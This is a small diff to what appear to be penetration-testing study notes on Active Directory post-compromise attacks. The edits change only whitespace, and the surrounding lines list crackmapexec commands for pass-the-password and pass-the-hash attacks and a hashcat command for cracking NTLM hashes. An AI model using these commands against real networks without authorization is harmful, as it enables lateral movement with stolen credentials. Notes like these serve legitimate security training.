@@ -115,6 +115,7 @@
 
 <h1>Post-Compromise Attacks</h1>
 - pass the password attacks
+ 
 	- crackmapexec 
 		- crackmapexec <ip/cidr> -u <user> -d <domain> -p <pass>
 		- pass it locally crackmapexec <ip/cidr> -u <user> -H <hash> --local
@@ -133,7 +134,7 @@
 		- hashcat64.exe -m 1000 hashfile.txt wordlist.txt
 		- can pass the hash ntlm hashes but not ntlmv2
 		- account with blank password means it could be disabled
--  pass the hash attacks
+- pass the hash attacks
 	- second half of the credential is the hash
 	- crackmapexec smb <ip/cidr> -u "username" -H <hash> --local-auth
 		- green + means that it work
